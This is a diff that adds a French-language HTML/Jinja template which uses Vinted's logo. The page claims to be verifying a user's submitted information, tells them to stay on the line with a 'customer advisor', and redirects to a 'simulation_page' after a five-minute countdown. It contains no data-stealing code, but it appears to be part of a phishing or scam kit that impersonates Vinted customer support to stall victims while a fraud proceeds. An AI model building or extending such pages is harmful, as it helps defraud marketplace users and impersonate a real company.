@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification en cours</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .container {
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 600px;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+            text-align: center;
+            margin: 15px auto;
+            box-sizing: border-box;
+            max-height: calc(100vh - 30px);
+            overflow-y: auto;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 140px;
+            height: auto;
+            border: 0;
+        }
+        h1 {
+            font-size: 1.8em;
+            color: #007b76;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        .section-text {
+            font-size: 0.95em;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            color: #444;
+        }
+        .countdown {
+            font-size: 2.5em;
+            font-weight: 700;
+            color: #007b76;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        .info-next-step {
+            font-size: 0.9em;
+            line-height: 1.5;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #e9f5f5;
+            border-left: 5px solid #007b76;
+            border-radius: 5px;
+            text-align: left;
+        }
+        .button-received {
+            display: inline-block;
+            width: 100%;
+            padding: 12px;
+            font-size: 1.05em;
+            color: #ffffff;
+            background-color: #007b76;
+            border: none;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 25px;
+            box-shadow: 0 4px 15px rgba(0, 123, 118, 0.3);
+        }
+        .button-received:hover {
+            background-color: #00605c;
+            transform: translateY(-2px);
+        }
+        footer {
+            text-align: center;
+            padding: 10px 0;
+            color: #777;
+            font-size: 0.8em;
+            width: 100%;
+            margin-top: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
+        </div>
+
+        <h1>Vérification des informations que vous avez renseignées</h1>
+
+        <p class="section-text">
+            Veuillez patienter pendant la vérification de vos informations.
+            Cette étape est nécessaire afin d'assurer la conformité et la sécurité de votre dossier.
+        </p>
+
+        <!-- Compte à rebours -->
+        <div id="countdown" class="countdown">05:00</div>
+
+        <p class="info-next-step">
+            <strong>Merci de rester en ligne avec le conseiller client</strong>
+            pour la suite des étapes. Le processus de vérification prendra quelques instants.
+        </p>
+
+        <!-- Bouton manuel -->
+        <a href="{{ url_for('simulation_page') }}" id="received-button" class="button-received">
+            Continuer vers l’étape suivante
+        </a>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Assistance Client - Service de vérification.</p>
+    </footer>
+
+    <script>
+        let timeLeft = 300; // 5 minutes = 300 secondes
+        const countdownElement = document.getElementById('countdown');
+
+        function updateCountdown() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.textContent =
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                countdownElement.textContent = "Redirection...";
+                // ✅ Redirection vers la page de simulation
+                window.location.href = "{{ url_for('simulation_page') }}";
+            }
+            timeLeft--;
+        }
+
+        const countdownInterval = setInterval(updateCountdown, 1000);
+        updateCountdown(); // Lancer immédiatement l’affichage initial
+    </script>
+</body>
+</html>
